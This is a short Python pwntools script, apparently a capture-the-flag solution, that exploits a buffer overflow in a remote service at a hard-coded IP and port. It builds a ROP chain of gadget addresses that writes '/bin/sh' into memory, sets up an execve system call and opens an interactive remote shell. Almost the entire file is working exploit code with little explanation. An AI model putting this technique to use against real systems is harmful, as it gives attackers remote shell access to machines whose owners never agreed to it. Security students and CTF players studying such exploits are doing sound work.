#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Author : yuan
# https://30cm.ml

host = "140.115.59.7"
port = 11003

yuan = remote(host,port)

payload = "a"*40

payload += p64(0x0000000000437045) #pop rdx ; ret
payload += "/bin/sh"+'\x00'
payload += p64(0x0000000000401693) #pop rdi ; ret
payload += "\x00\x00\x00\x00\x00\x6c\x00\x6a"
payload += p64(0x000000000042a377) #mov qword ptr [rdi - 0xa], rdx ; mov dword ptr [rdi - 4], ecx ; ret

payload += p64(0x0000000000401700) #: xor eax, eax ; ret
payload += p64(0x000000000041eeef) #xchg eax, ecx ; sub eax, edx ; ret   $ecx = 0
payload += p64(0x000000000043316f) ##mov eax, 0x10 ; pop rbx ; ret
payload += p64(0x0000000000432bd4) * 5 #sub eax, 1 ; ret                 $eax = 11

# ------

payload += p64(0x0000000000437045) #pop rdx ; ret
payload += p64(0x00000000006c0060) # !!!address /bin/sh   address of address 0x00000000006c0080
payload += p64(0x0000000000401693) #pop rdi ; ret
payload += p64(0x00000000006c009a)
payload += p64(0x000000000042a377) #mov qword ptr [rdi - 0xa], rdx ; mov dword ptr [rdi - 4], ecx ; ret


payload += p64(0x0000000000400494) #pop rsp ; ret
payload += p64(0x00000000006c0080)  # $rsp = address of address 0x00000000006c0080
payload += p64(0x000000000046a4ef) #mov ebx, dword ptr [rsp] ; add rsp, 0x30 ; ret


payload += p64(0x0000000000483f33) #xor edx, edx ; or cl, cl ; cmove rax, rdx ; ret

payload += p64(0x0000000000437067)
#payload += p64(0x000000000045b365)

yuan.sendline(payload)

yuan.interactive()

